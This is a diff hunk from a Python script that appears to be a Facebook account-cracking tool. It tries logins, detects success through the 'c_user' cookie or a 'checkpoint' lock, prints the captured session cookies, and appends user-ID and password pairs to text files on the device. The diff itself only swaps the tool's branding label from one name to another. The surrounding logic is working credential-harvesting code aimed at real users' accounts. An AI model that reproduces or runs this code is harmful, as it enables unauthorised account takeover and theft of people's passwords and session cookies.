@@ -1851,21 +1851,21 @@ def freeq(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[151:166]
-                print(f'\r\33[1;97m[SHAHID-OK] '+uid+' | '+ps+  ' \n \0333Cookie = \033[1;32m'+coki+ ' \n '+pro+' \033[1;32m')
+                print(f'\r\33[1;97m[AHSAN-OK] '+uid+' | '+ps+  ' \n \0333Cookie = \033[1;32m'+coki+ ' \n '+pro+' \033[1;32m')
                 cek_apk(session,coki)
-                open('/sdcard/SHAHID-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/AHSAN-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[141:156]
-                    print(f'\r\33[1;91m[SHAHID-CP] '+uid+' | '+ps+' ')
-                    open('/sdcard/SHAHID-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    print(f'\r\33[1;91m[AHSAN-CP] '+uid+' | '+ps+' ')
+                    open('/sdcard/AHSAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[SHAHID] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[AHSAN RJ] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
     except:
         pass 
